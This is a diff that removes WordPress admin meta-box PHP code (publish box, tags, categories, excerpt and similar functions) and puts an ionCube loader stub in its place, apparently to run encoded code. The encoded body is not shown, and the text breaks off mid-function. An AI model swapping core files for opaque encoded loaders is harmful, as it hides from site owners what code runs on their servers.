@@ -1,1284 +1,671 @@
-<?php
-
-// -- Post related Meta Boxes
-
-/**
- * Displays post submit form fields.
- *
- * @since 2.7.0
- *
- * @global string $action
- *
- * @param WP_Post  $post Current post object.
- * @param array    $args {
- *     Array of arguments for building the post submit meta box.
- *
- *     @type string   $id       Meta box 'id' attribute.
- *     @type string   $title    Meta box title.
- *     @type callable $callback Meta box display callback.
- *     @type array    $args     Extra meta box arguments.
- * }
- */
-function post_submit_meta_box( $post, $args = array() ) {
-	global $action;
-
-	$post_type = $post->post_type;
-	$post_type_object = get_post_type_object($post_type);
-	$can_publish = current_user_can($post_type_object->cap->publish_posts);
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-<div class="submitbox" id="submitpost">
-
-<div id="minor-publishing">
-
-<?php // Hidden submit button early on so that the browser chooses the right button when form is submitted with Return key ?>
-<div style="display:none;">
-<?php submit_button( __( 'Save' ), '', 'save' ); ?>
-</div>
-
-<div id="minor-publishing-actions">
-<div id="save-action">
-<?php if ( 'publish' != $post->post_status && 'future' != $post->post_status && 'pending' != $post->post_status ) { ?>
-<input <?php if ( 'private' == $post->post_status ) { ?>style="display:none"<?php } ?> type="submit" name="save" id="save-post" value="<?php esc_attr_e('Save Draft'); ?>" class="button" />
-<span class="spinner"></span>
-<?php } elseif ( 'pending' == $post->post_status && $can_publish ) { ?>
-<input type="submit" name="save" id="save-post" value="<?php esc_attr_e('Save as Pending'); ?>" class="button" />
-<span class="spinner"></span>
-<?php } ?>
-</div>
-<?php if ( is_post_type_viewable( $post_type_object ) ) : ?>
-<div id="preview-action">
-<?php
-$preview_link = esc_url( get_preview_post_link( $post ) );
-if ( 'publish' == $post->post_status ) {
-	$preview_button_text = __( 'Preview Changes' );
-} else {
-	$preview_button_text = __( 'Preview' );
-}
-
-$preview_button = sprintf( '%1$s<span class="screen-reader-text"> %2$s</span>',
-	$preview_button_text,
-	/* translators: accessibility text */
-	__( '(opens in a new window)' )
-);
-?>
-<a class="preview button" href="<?php echo $preview_link; ?>" target="wp-preview-<?php echo (int) $post->ID; ?>" id="post-preview"><?php echo $preview_button; ?></a>
-<input type="hidden" name="wp-preview" id="wp-preview" value="" />
-</div>
-<?php endif; // public post type ?>
-<?php
-/**
- * Fires before the post time/date setting in the Publish meta box.
- *
- * @since 4.4.0
- *
- * @param WP_Post $post WP_Post object for the current post.
- */
-do_action( 'post_submitbox_minor_actions', $post );
-?>
-<div class="clear"></div>
-</div><!-- #minor-publishing-actions -->
-
-<div id="misc-publishing-actions">
-
-<div class="misc-pub-section misc-pub-post-status">
-<?php _e( 'Status:' ) ?> <span id="post-status-display"><?php
-
-switch ( $post->post_status ) {
-	case 'private':
-		_e('Privately Published');
-		break;
-	case 'publish':
-		_e('Published');
-		break;
-	case 'future':
-		_e('Scheduled');
-		break;
-	case 'pending':
-		_e('Pending Review');
-		break;
-	case 'draft':
-	case 'auto-draft':
-		_e('Draft');
-		break;
-}
-?>
-</span>
-<?php if ( 'publish' == $post->post_status || 'private' == $post->post_status || $can_publish ) { ?>
-<a href="#post_status" <?php if ( 'private' == $post->post_status ) { ?>style="display:none;" <?php } ?>class="edit-post-status hide-if-no-js" role="button"><span aria-hidden="true"><?php _e( 'Edit' ); ?></span> <span class="screen-reader-text"><?php _e( 'Edit status' ); ?></span></a>
-
-<div id="post-status-select" class="hide-if-js">
-<input type="hidden" name="hidden_post_status" id="hidden_post_status" value="<?php echo esc_attr( ('auto-draft' == $post->post_status ) ? 'draft' : $post->post_status); ?>" />
-<label for="post_status" class="screen-reader-text"><?php _e( 'Set status' ) ?></label>
-<select name="post_status" id="post_status">
-<?php if ( 'publish' == $post->post_status ) : ?>
-<option<?php selected( $post->post_status, 'publish' ); ?> value='publish'><?php _e('Published') ?></option>
-<?php elseif ( 'private' == $post->post_status ) : ?>
-<option<?php selected( $post->post_status, 'private' ); ?> value='publish'><?php _e('Privately Published') ?></option>
-<?php elseif ( 'future' == $post->post_status ) : ?>
-<option<?php selected( $post->post_status, 'future' ); ?> value='future'><?php _e('Scheduled') ?></option>
-<?php endif; ?>
-<option<?php selected( $post->post_status, 'pending' ); ?> value='pending'><?php _e('Pending Review') ?></option>
-<?php if ( 'auto-draft' == $post->post_status ) : ?>
-<option<?php selected( $post->post_status, 'auto-draft' ); ?> value='draft'><?php _e('Draft') ?></option>
-<?php else : ?>
-<option<?php selected( $post->post_status, 'draft' ); ?> value='draft'><?php _e('Draft') ?></option>
-<?php endif; ?>
-</select>
- <a href="#post_status" class="save-post-status hide-if-no-js button"><?php _e('OK'); ?></a>
- <a href="#post_status" class="cancel-post-status hide-if-no-js button-cancel"><?php _e('Cancel'); ?></a>
-</div>
-
-<?php } ?>
-</div><!-- .misc-pub-section -->
-
-<div class="misc-pub-section misc-pub-visibility" id="visibility">
-<?php _e('Visibility:'); ?> <span id="post-visibility-display"><?php
-
-if ( 'private' == $post->post_status ) {
-	$post->post_password = '';
-	$visibility = 'private';
-	$visibility_trans = __('Private');
-} elseif ( !empty( $post->post_password ) ) {
-	$visibility = 'password';
-	$visibility_trans = __('Password protected');
-} elseif ( $post_type == 'post' && is_sticky( $post->ID ) ) {
-	$visibility = 'public';
-	$visibility_trans = __('Public, Sticky');
-} else {
-	$visibility = 'public';
-	$visibility_trans = __('Public');
-}
-
-echo esc_html( $visibility_trans ); ?></span>
-<?php if ( $can_publish ) { ?>
-<a href="#visibility" class="edit-visibility hide-if-no-js" role="button"><span aria-hidden="true"><?php _e( 'Edit' ); ?></span> <span class="screen-reader-text"><?php _e( 'Edit visibility' ); ?></span></a>
-
-<div id="post-visibility-select" class="hide-if-js">
-<input type="hidden" name="hidden_post_password" id="hidden-post-password" value="<?php echo esc_attr($post->post_password); ?>" />
-<?php if ($post_type == 'post'): ?>
-<input type="checkbox" style="display:none" name="hidden_post_sticky" id="hidden-post-sticky" value="sticky" <?php checked(is_sticky($post->ID)); ?> />
-<?php endif; ?>
-<input type="hidden" name="hidden_post_visibility" id="hidden-post-visibility" value="<?php echo esc_attr( $visibility ); ?>" />
-<input type="radio" name="visibility" id="visibility-radio-public" value="public" <?php checked( $visibility, 'public' ); ?> /> <label for="visibility-radio-public" class="selectit"><?php _e('Public'); ?></label><br />
-<?php if ( $post_type == 'post' && current_user_can( 'edit_others_posts' ) ) : ?>
-<span id="sticky-span"><input id="sticky" name="sticky" type="checkbox" value="sticky" <?php checked( is_sticky( $post->ID ) ); ?> /> <label for="sticky" class="selectit"><?php _e( 'Stick this post to the front page' ); ?></label><br /></span>
-<?php endif; ?>
-<input type="radio" name="visibility" id="visibility-radio-password" value="password" <?php checked( $visibility, 'password' ); ?> /> <label for="visibility-radio-password" class="selectit"><?php _e('Password protected'); ?></label><br />
-<span id="password-span"><label for="post_password"><?php _e('Password:'); ?></label> <input type="text" name="post_password" id="post_password" value="<?php echo esc_attr($post->post_password); ?>"  maxlength="255" /><br /></span>
-<input type="radio" name="visibility" id="visibility-radio-private" value="private" <?php checked( $visibility, 'private' ); ?> /> <label for="visibility-radio-private" class="selectit"><?php _e('Private'); ?></label><br />
-
-<p>
- <a href="#visibility" class="save-post-visibility hide-if-no-js button"><?php _e('OK'); ?></a>
- <a href="#visibility" class="cancel-post-visibility hide-if-no-js button-cancel"><?php _e('Cancel'); ?></a>
-</p>
-</div>
-<?php } ?>
-
-</div><!-- .misc-pub-section -->
-
-<?php
-/* translators: Publish box date format, see https://secure.php.net/date */
-$datef = __( 'M j, Y @ H:i' );
-if ( 0 != $post->ID ) {
-	if ( 'future' == $post->post_status ) { // scheduled for publishing at a future date
-		/* translators: Post date information. 1: Date on which the post is currently scheduled to be published */
-		$stamp = __('Scheduled for: <b>%1$s</b>');
-	} elseif ( 'publish' == $post->post_status || 'private' == $post->post_status ) { // already published
-		/* translators: Post date information. 1: Date on which the post was published */
-		$stamp = __('Published on: <b>%1$s</b>');
-	} elseif ( '0000-00-00 00:00:00' == $post->post_date_gmt ) { // draft, 1 or more saves, no date specified
-		$stamp = __('Publish <b>immediately</b>');
-	} elseif ( time() < strtotime( $post->post_date_gmt . ' +0000' ) ) { // draft, 1 or more saves, future date specified
-		/* translators: Post date information. 1: Date on which the post is to be published */
-		$stamp = __('Schedule for: <b>%1$s</b>');
-	} else { // draft, 1 or more saves, date specified
-		/* translators: Post date information. 1: Date on which the post is to be published */
-		$stamp = __('Publish on: <b>%1$s</b>');
-	}
-	$date = date_i18n( $datef, strtotime( $post->post_date ) );
-} else { // draft (no saves, and thus no date specified)
-	$stamp = __('Publish <b>immediately</b>');
-	$date = date_i18n( $datef, strtotime( current_time('mysql') ) );
-}
-
-if ( ! empty( $args['args']['revisions_count'] ) ) : ?>
-<div class="misc-pub-section misc-pub-revisions">
-	<?php
-		/* translators: Post revisions heading. 1: The number of available revisions */
-		printf( __( 'Revisions: %s' ), '<b>' . number_format_i18n( $args['args']['revisions_count'] ) . '</b>' );
-	?>
-	<a class="hide-if-no-js" href="<?php echo esc_url( get_edit_post_link( $args['args']['revision_id'] ) ); ?>"><span aria-hidden="true"><?php _ex( 'Browse', 'revisions' ); ?></span> <span class="screen-reader-text"><?php _e( 'Browse revisions' ); ?></span></a>
-</div>
-<?php endif;
-
-if ( $can_publish ) : // Contributors don't get to choose the date of publish ?>
-<div class="misc-pub-section curtime misc-pub-curtime">
-	<span id="timestamp">
-	<?php printf($stamp, $date); ?></span>
-	<a href="#edit_timestamp" class="edit-timestamp hide-if-no-js" role="button"><span aria-hidden="true"><?php _e( 'Edit' ); ?></span> <span class="screen-reader-text"><?php _e( 'Edit date and time' ); ?></span></a>
-	<fieldset id="timestampdiv" class="hide-if-js">
-	<legend class="screen-reader-text"><?php _e( 'Date and time' ); ?></legend>
-	<?php touch_time( ( $action === 'edit' ), 1 ); ?>
-	</fieldset>
-</div><?php // /misc-pub-section ?>
-<?php endif; ?>
-
-<?php if ( 'draft' === $post->post_status && get_post_meta( $post->ID, '_customize_changeset_uuid', true ) ) : ?>
-	<div class="notice notice-info notice-alt inline">
-		<p>
-			<?php
-			echo sprintf(
-				/* translators: %s: URL to the Customizer */
-				__( 'This draft comes from your <a href="%s">unpublished customization changes</a>. You can edit, but there&#8217;s no need to publish now. It will be published automatically with those changes.' ),
-				esc_url(
-					add_query_arg(
-						'changeset_uuid',
-						rawurlencode( get_post_meta( $post->ID, '_customize_changeset_uuid', true ) ),
-						admin_url( 'customize.php' )
-					)
-				)
-			);
-			?>
-		</p>
-	</div>
-<?php endif; ?>
-
-<?php
-/**
- * Fires after the post time/date setting in the Publish meta box.
- *
- * @since 2.9.0
- * @since 4.4.0 Added the `$post` parameter.
- *
- * @param WP_Post $post WP_Post object for the current post.
- */
-do_action( 'post_submitbox_misc_actions', $post );
-?>
-</div>
-<div class="clear"></div>
-</div>
-
-<div id="major-publishing-actions">
-<?php
-/**
- * Fires at the beginning of the publishing actions section of the Publish meta box.
- *
- * @since 2.7.0
- * @since 4.9.0 Added the `$post` parameter.
- *
- * @param WP_Post|null $post WP_Post object for the current post on Edit Post screen,
- *                           null on Edit Link screen.
- */
-do_action( 'post_submitbox_start', $post );
-?>
-<div id="delete-action">
-<?php
-if ( current_user_can( "delete_post", $post->ID ) ) {
-	if ( !EMPTY_TRASH_DAYS )
-		$delete_text = __('Delete Permanently');
-	else
-		$delete_text = __('Move to Trash');
-	?>
-<a class="submitdelete deletion" href="<?php echo get_delete_post_link($post->ID); ?>"><?php echo $delete_text; ?></a><?php
-} ?>
-</div>
-
-<div id="publishing-action">
-<span class="spinner"></span>
-<?php
-if ( !in_array( $post->post_status, array('publish', 'future', 'private') ) || 0 == $post->ID ) {
-	if ( $can_publish ) :
-		if ( !empty($post->post_date_gmt) && time() < strtotime( $post->post_date_gmt . ' +0000' ) ) : ?>
-		<input name="original_publish" type="hidden" id="original_publish" value="<?php echo esc_attr_x( 'Schedule', 'post action/button label' ); ?>" />
-		<?php submit_button( _x( 'Schedule', 'post action/button label' ), 'primary large', 'publish', false ); ?>
-<?php	else : ?>
-		<input name="original_publish" type="hidden" id="original_publish" value="<?php esc_attr_e('Publish') ?>" />
-		<?php submit_button( __( 'Publish' ), 'primary large', 'publish', false ); ?>
-<?php	endif;
-	else : ?>
-		<input name="original_publish" type="hidden" id="original_publish" value="<?php esc_attr_e('Submit for Review') ?>" />
-		<?php submit_button( __( 'Submit for Review' ), 'primary large', 'publish', false ); ?>
-<?php
-	endif;
-} else { ?>
-		<input name="original_publish" type="hidden" id="original_publish" value="<?php esc_attr_e('Update') ?>" />
-		<input name="save" type="submit" class="button button-primary button-large" id="publish" value="<?php esc_attr_e( 'Update' ) ?>" />
-<?php
-} ?>
-</div>
-<div class="clear"></div>
-</div>
-</div>
-
-<?php
-}
-
-/**
- * Display attachment submit form fields.
- *
- * @since 3.5.0
- *
- * @param object $post
- */
-function attachment_submit_meta_box( $post ) {
-?>
-<div class="submitbox" id="submitpost">
-
-<div id="minor-publishing">
-
-<?php // Hidden submit button early on so that the browser chooses the right button when form is submitted with Return key ?>
-<div style="display:none;">
-<?php submit_button( __( 'Save' ), '', 'save' ); ?>
-</div>
-
-
-<div id="misc-publishing-actions">
-	<div class="misc-pub-section curtime misc-pub-curtime">
-		<span id="timestamp"><?php
-			$date = date_i18n(
-				/* translators: Publish box date format, see https://secure.php.net/date */
-				__( 'M j, Y @ H:i' ),
-				strtotime( $post->post_date )
-			);
-			printf(
-				/* translators: Attachment information. %s: Date the attachment was uploaded */
-				__( 'Uploaded on: %s' ),
-				'<b>' . $date . '</b>'
-			);
-		?></span>
-	</div><!-- .misc-pub-section -->
-
-	<?php
-	/**
-	 * Fires after the 'Uploaded on' section of the Save meta box
-	 * in the attachment editing screen.
-	 *
-	 * @since 3.5.0
-	 * @since 4.9.0 Added the `$post` parameter.
-	 *
-	 * @param WP_Post $post WP_Post object for the current attachment. 
-	 */
-	do_action( 'attachment_submitbox_misc_actions', $post );
-	?>
-</div><!-- #misc-publishing-actions -->
-<div class="clear"></div>
-</div><!-- #minor-publishing -->
-
-<div id="major-publishing-actions">
-	<div id="delete-action">
-	<?php
-	if ( current_user_can( 'delete_post', $post->ID ) )
-		if ( EMPTY_TRASH_DAYS && MEDIA_TRASH ) {
-			echo "<a class='submitdelete deletion' href='" . get_delete_post_link( $post->ID ) . "'>" . _x( 'Trash', 'verb' ) . "</a>";
-		} else {
-			$delete_ays = ! MEDIA_TRASH ? " onclick='return showNotice.warn();'" : '';
-			echo  "<a class='submitdelete deletion'$delete_ays href='" . get_delete_post_link( $post->ID, null, true ) . "'>" . __( 'Delete Permanently' ) . "</a>";
-		}
-	?>
-	</div>
-
-	<div id="publishing-action">
-		<span class="spinner"></span>
-		<input name="original_publish" type="hidden" id="original_publish" value="<?php esc_attr_e('Update') ?>" />
-		<input name="save" type="submit" class="button button-primary button-large" id="publish" value="<?php esc_attr_e( 'Update' ) ?>" />
-	</div>
-	<div class="clear"></div>
-</div><!-- #major-publishing-actions -->
-
-</div>
-
-<?php
-}
-
-/**
- * Display post format form elements.
- *
- * @since 3.1.0
- *
- * @param WP_Post $post Post object.
- * @param array   $box {
- *     Post formats meta box arguments.
- *
- *     @type string   $id       Meta box 'id' attribute.
- *     @type string   $title    Meta box title.
- *     @type callable $callback Meta box display callback.
- *     @type array    $args     Extra meta box arguments.
- * }
- */
-function post_format_meta_box( $post, $box ) {
-	if ( current_theme_supports( 'post-formats' ) && post_type_supports( $post->post_type, 'post-formats' ) ) :
-	$post_formats = get_theme_support( 'post-formats' );
-
-	if ( is_array( $post_formats[0] ) ) :
-		$post_format = get_post_format( $post->ID );
-		if ( !$post_format )
-			$post_format = '0';
-		// Add in the current one if it isn't there yet, in case the current theme doesn't support it
-		if ( $post_format && !in_array( $post_format, $post_formats[0] ) )
-			$post_formats[0][] = $post_format;
-	?>
-	<div id="post-formats-select">
-		<fieldset>
-			<legend class="screen-reader-text"><?php _e( 'Post Formats' ); ?></legend>
-			<input type="radio" name="post_format" class="post-format" id="post-format-0" value="0" <?php checked( $post_format, '0' ); ?> /> <label for="post-format-0" class="post-format-icon post-format-standard"><?php echo get_post_format_string( 'standard' ); ?></label>
-			<?php foreach ( $post_formats[0] as $format ) : ?>
-			<br /><input type="radio" name="post_format" class="post-format" id="post-format-<?php echo esc_attr( $format ); ?>" value="<?php echo esc_attr( $format ); ?>" <?php checked( $post_format, $format ); ?> /> <label for="post-format-<?php echo esc_attr( $format ); ?>" class="post-format-icon post-format-<?php echo esc_attr( $format ); ?>"><?php echo esc_html( get_post_format_string( $format ) ); ?></label>
-			<?php endforeach; ?>
-		</fieldset>
-	</div>
-	<?php endif; endif;
-}
-
-/**
- * Display post tags form fields.
- *
- * @since 2.6.0
- *
- * @todo Create taxonomy-agnostic wrapper for this.
- *
- * @param WP_Post $post Post object.
- * @param array   $box {
- *     Tags meta box arguments.
- *
- *     @type string   $id       Meta box 'id' attribute.
- *     @type string   $title    Meta box title.
- *     @type callable $callback Meta box display callback.
- *     @type array    $args {
- *         Extra meta box arguments.
- *
- *         @type string $taxonomy Taxonomy. Default 'post_tag'.
- *     }
- * }
- */
-function post_tags_meta_box( $post, $box ) {
-	$defaults = array( 'taxonomy' => 'post_tag' );
-	if ( ! isset( $box['args'] ) || ! is_array( $box['args'] ) ) {
-		$args = array();
-	} else {
-		$args = $box['args'];
-	}
-	$r = wp_parse_args( $args, $defaults );
-	$tax_name = esc_attr( $r['taxonomy'] );
-	$taxonomy = get_taxonomy( $r['taxonomy'] );
-	$user_can_assign_terms = current_user_can( $taxonomy->cap->assign_terms );
-	$comma = _x( ',', 'tag delimiter' );
-	$terms_to_edit = get_terms_to_edit( $post->ID, $tax_name );
-	if ( ! is_string( $terms_to_edit ) ) {
-		$terms_to_edit = '';
-	}
-?>
-<div class="tagsdiv" id="<?php echo $tax_name; ?>">
-	<div class="jaxtag">
-	<div class="nojs-tags hide-if-js">
-		<label for="tax-input-<?php echo $tax_name; ?>"><?php echo $taxonomy->labels->add_or_remove_items; ?></label>
-		<p><textarea name="<?php echo "tax_input[$tax_name]"; ?>" rows="3" cols="20" class="the-tags" id="tax-input-<?php echo $tax_name; ?>" <?php disabled( ! $user_can_assign_terms ); ?> aria-describedby="new-tag-<?php echo $tax_name; ?>-desc"><?php echo str_replace( ',', $comma . ' ', $terms_to_edit ); // textarea_escaped by esc_attr() ?></textarea></p>
-	</div>
- 	<?php if ( $user_can_assign_terms ) : ?>
-	<div class="ajaxtag hide-if-no-js">
-		<label class="screen-reader-text" for="new-tag-<?php echo $tax_name; ?>"><?php echo $taxonomy->labels->add_new_item; ?></label>
-		<p><input data-wp-taxonomy="<?php echo $tax_name; ?>" type="text" id="new-tag-<?php echo $tax_name; ?>" name="newtag[<?php echo $tax_name; ?>]" class="newtag form-input-tip" size="16" autocomplete="off" aria-describedby="new-tag-<?php echo $tax_name; ?>-desc" value="" />
-		<input type="button" class="button tagadd" value="<?php esc_attr_e('Add'); ?>" /></p>
-	</div>
-	<p class="howto" id="new-tag-<?php echo $tax_name; ?>-desc"><?php echo $taxonomy->labels->separate_items_with_commas; ?></p>
-	<?php elseif ( empty( $terms_to_edit ) ): ?>
-		<p><?php echo $taxonomy->labels->no_terms; ?></p>
-	<?php endif; ?>
-	</div>
-	<ul class="tagchecklist" role="list"></ul>
-</div>
-<?php if ( $user_can_assign_terms ) : ?>
-<p class="hide-if-no-js"><button type="button" class="button-link tagcloud-link" id="link-<?php echo $tax_name; ?>" aria-expanded="false"><?php echo $taxonomy->labels->choose_from_most_used; ?></button></p>
-<?php endif; ?>
-<?php
-}
-
-/**
- * Display post categories form fields.
- *
- * @since 2.6.0
- *
- * @todo Create taxonomy-agnostic wrapper for this.
- *
- * @param WP_Post $post Post object.
- * @param array   $box {
- *     Categories meta box arguments.
- *
- *     @type string   $id       Meta box 'id' attribute.
- *     @type string   $title    Meta box title.
- *     @type callable $callback Meta box display callback.
- *     @type array    $args {
- *         Extra meta box arguments.
- *
- *         @type string $taxonomy Taxonomy. Default 'category'.
- *     }
- * }
- */
-function post_categories_meta_box( $post, $box ) {
-	$defaults = array( 'taxonomy' => 'category' );
-	if ( ! isset( $box['args'] ) || ! is_array( $box['args'] ) ) {
-		$args = array();
-	} else {
-		$args = $box['args'];
-	}
-	$r = wp_parse_args( $args, $defaults );
-	$tax_name = esc_attr( $r['taxonomy'] );
-	$taxonomy = get_taxonomy( $r['taxonomy'] );
-	?>
-	<div id="taxonomy-<?php echo $tax_name; ?>" class="categorydiv">
-		<ul id="<?php echo $tax_name; ?>-tabs" class="category-tabs">
-			<li class="tabs"><a href="#<?php echo $tax_name; ?>-all"><?php echo $taxonomy->labels->all_items; ?></a></li>
-			<li class="hide-if-no-js"><a href="#<?php echo $tax_name; ?>-pop"><?php echo esc_html( $taxonomy->labels->most_used ); ?></a></li>
-		</ul>
-
-		<div id="<?php echo $tax_name; ?>-pop" class="tabs-panel" style="display: none;">
-			<ul id="<?php echo $tax_name; ?>checklist-pop" class="categorychecklist form-no-clear" >
-				<?php $popular_ids = wp_popular_terms_checklist( $tax_name ); ?>
-			</ul>
-		</div>
-
-		<div id="<?php echo $tax_name; ?>-all" class="tabs-panel">
-			<?php
-			$name = ( $tax_name == 'category' ) ? 'post_category' : 'tax_input[' . $tax_name . ']';
-			echo "<input type='hidden' name='{$name}[]' value='0' />"; // Allows for an empty term set to be sent. 0 is an invalid Term ID and will be ignored by empty() checks.
-			?>
-			<ul id="<?php echo $tax_name; ?>checklist" data-wp-lists="list:<?php echo $tax_name; ?>" class="categorychecklist form-no-clear">
-				<?php wp_terms_checklist( $post->ID, array( 'taxonomy' => $tax_name, 'popular_cats' => $popular_ids ) ); ?>
-			</ul>
-		</div>
-	<?php if ( current_user_can( $taxonomy->cap->edit_terms ) ) : ?>
-			<div id="<?php echo $tax_name; ?>-adder" class="wp-hidden-children">
-				<a id="<?php echo $tax_name; ?>-add-toggle" href="#<?php echo $tax_name; ?>-add" class="hide-if-no-js taxonomy-add-new">
-					<?php
-						/* translators: %s: add new taxonomy label */
-						printf( __( '+ %s' ), $taxonomy->labels->add_new_item );
-					?>
-				</a>
-				<p id="<?php echo $tax_name; ?>-add" class="category-add wp-hidden-child">
-					<label class="screen-reader-text" for="new<?php echo $tax_name; ?>"><?php echo $taxonomy->labels->add_new_item; ?></label>
-					<input type="text" name="new<?php echo $tax_name; ?>" id="new<?php echo $tax_name; ?>" class="form-required form-input-tip" value="<?php echo esc_attr( $taxonomy->labels->new_item_name ); ?>" aria-required="true"/>
-					<label class="screen-reader-text" for="new<?php echo $tax_name; ?>_parent">
-						<?php echo $taxonomy->labels->parent_item_colon; ?>
-					</label>
-					<?php
-					$parent_dropdown_args = array(
-						'taxonomy'         => $tax_name,
-						'hide_empty'       => 0,
-						'name'             => 'new' . $tax_name . '_parent',
-						'orderby'          => 'name',
-						'hierarchical'     => 1,
-						'show_option_none' => '&mdash; ' . $taxonomy->labels->parent_item . ' &mdash;',
-					);
-
-					/**
-					 * Filters the arguments for the taxonomy parent dropdown on the Post Edit page.
-					 *
-					 * @since 4.4.0
-					 *
-					 * @param array $parent_dropdown_args {
-					 *     Optional. Array of arguments to generate parent dropdown.
-					 *
-					 *     @type string   $taxonomy         Name of the taxonomy to retrieve.
-					 *     @type bool     $hide_if_empty    True to skip generating markup if no
-					 *                                      categories are found. Default 0.
-					 *     @type string   $name             Value for the 'name' attribute
-					 *                                      of the select element.
-					 *                                      Default "new{$tax_name}_parent".
-					 *     @type string   $orderby          Which column to use for ordering
-					 *                                      terms. Default 'name'.
-					 *     @type bool|int $hierarchical     Whether to traverse the taxonomy
-					 *                                      hierarchy. Default 1.
-					 *     @type string   $show_option_none Text to display for the "none" option.
-					 *                                      Default "&mdash; {$parent} &mdash;",
-					 *                                      where `$parent` is 'parent_item'
-					 *                                      taxonomy label.
-					 * }
-					 */
-					$parent_dropdown_args = apply_filters( 'post_edit_category_parent_dropdown_args', $parent_dropdown_args );
-
-					wp_dropdown_categories( $parent_dropdown_args );
-					?>
-					<input type="button" id="<?php echo $tax_name; ?>-add-submit" data-wp-lists="add:<?php echo $tax_name; ?>checklist:<?php echo $tax_name; ?>-add" class="button category-add-submit" value="<?php echo esc_attr( $taxonomy->labels->add_new_item ); ?>" />
-					<?php wp_nonce_field( 'add-' . $tax_name, '_ajax_nonce-add-' . $tax_name, false ); ?>
-					<span id="<?php echo $tax_name; ?>-ajax-response"></span>
-				</p>
-			</div>
-		<?php endif; ?>
-	</div>
-	<?php
-}
-
-/**
- * Display post excerpt form fields.
- *
- * @since 2.6.0
- *
- * @param object $post
- */
-function post_excerpt_meta_box($post) {
-?>
-<label class="screen-reader-text" for="excerpt"><?php _e('Excerpt') ?></label><textarea rows="1" cols="40" name="excerpt" id="excerpt"><?php echo $post->post_excerpt; // textarea_escaped ?></textarea>
-<p><?php
-	printf(
-		/* translators: %s: Codex URL */
-		__( 'Excerpts are optional hand-crafted summaries of your content that can be used in your theme. <a href="%s">Learn more about manual excerpts</a>.' ),
-		__( 'https://codex.wordpress.org/Excerpt' )
-	);
-?></p>
-<?php
-}
-
-/**
- * Display trackback links form fields.
- *
- * @since 2.6.0
- *
- * @param object $post
- */
-function post_trackback_meta_box($post) {
-	$form_trackback = '<input type="text" name="trackback_url" id="trackback_url" class="code" value="' .
-		esc_attr( str_replace( "\n", ' ', $post->to_ping ) ) . '" aria-describedby="trackback-url-desc" />';
-	if ('' != $post->pinged) {
-		$pings = '<p>'. __('Already pinged:') . '</p><ul>';
-		$already_pinged = explode("\n", trim($post->pinged));
-		foreach ($already_pinged as $pinged_url) {
-			$pings .= "\n\t<li>" . esc_html($pinged_url) . "</li>";
-		}
-		$pings .= '</ul>';
-	}
-
-?>
-<p>
-	<label for="trackback_url"><?php _e( 'Send trackbacks to:' ); ?></label>
-	<?php echo $form_trackback; ?>
-</p>
-<p id="trackback-url-desc" class="howto"><?php _e( 'Separate multiple URLs with spaces' ); ?></p>
-<p><?php
-	printf(
-		/* translators: %s: Codex URL */
-		__( 'Trackbacks are a way to notify legacy blog systems that you&#8217;ve linked to them. If you link other WordPress sites, they&#8217;ll be notified automatically using <a href="%s">pingbacks</a>, no other action necessary.' ),
-		__( 'https://codex.wordpress.org/Introduction_to_Blogging#Managing_Comments' )
-	);
-?></p>
-<?php
-if ( ! empty($pings) )
-	echo $pings;
-}
-
-/**
- * Display custom fields form fields.
- *
- * @since 2.6.0
- *
- * @param object $post
- */
-function post_custom_meta_box($post) {
-?>
-<div id="postcustomstuff">
-<div id="ajax-response"></div>
-<?php
-$metadata = has_meta($post->ID);
-foreach ( $metadata as $key => $value ) {
-	if ( is_protected_meta( $metadata[ $key ][ 'meta_key' ], 'post' ) || ! current_user_can( 'edit_post_meta', $post->ID, $metadata[ $key ][ 'meta_key' ] ) )
-		unset( $metadata[ $key ] );
-}
-list_meta( $metadata );
-meta_form( $post ); ?>
-</div>
-<p><?php
-	printf(
-		/* translators: %s: Codex URL */
-		__( 'Custom fields can be used to add extra metadata to a post that you can <a href="%s">use in your theme</a>.' ),
-		__( 'https://codex.wordpress.org/Using_Custom_Fields' )
-	);
-?></p>
-<?php
-}
-
-/**
- * Display comments status form fields.
- *
- * @since 2.6.0
- *
- * @param object $post
- */
-function post_comment_status_meta_box($post) {
-?>
-<input name="advanced_view" type="hidden" value="1" />
-<p class="meta-options">
-	<label for="comment_status" class="selectit"><input name="comment_status" type="checkbox" id="comment_status" value="open" <?php checked($post->comment_status, 'open'); ?> /> <?php _e( 'Allow comments' ) ?></label><br />
-	<label for="ping_status" class="selectit"><input name="ping_status" type="checkbox" id="ping_status" value="open" <?php checked($post->ping_status, 'open'); ?> /> <?php
-		printf(
-			/* translators: %s: Codex URL */
-			__( 'Allow <a href="%s">trackbacks and pingbacks</a> on this page' ),
-			__( 'https://codex.wordpress.org/Introduction_to_Blogging#Managing_Comments' ) );
-		?></label>
-	<?php
-	/**
-	 * Fires at the end of the Discussion meta box on the post editing screen.
-	 *
-	 * @since 3.1.0
-	 *
-	 * @param WP_Post $post WP_Post object of the current post.
-	 */
-	do_action( 'post_comment_status_meta_box-options', $post );
-	?>
-</p>
-<?php
-}
-
-/**
- * Display comments for post table header
- *
- * @since 3.0.0
- *
- * @param array $result table header rows
- * @return array
- */
-function post_comment_meta_box_thead($result) {
-	unset($result['cb'], $result['response']);
-	return $result;
-}
-
-/**
- * Display comments for post.
- *
- * @since 2.8.0
- *
- * @param object $post
- */
-function post_comment_meta_box( $post ) {
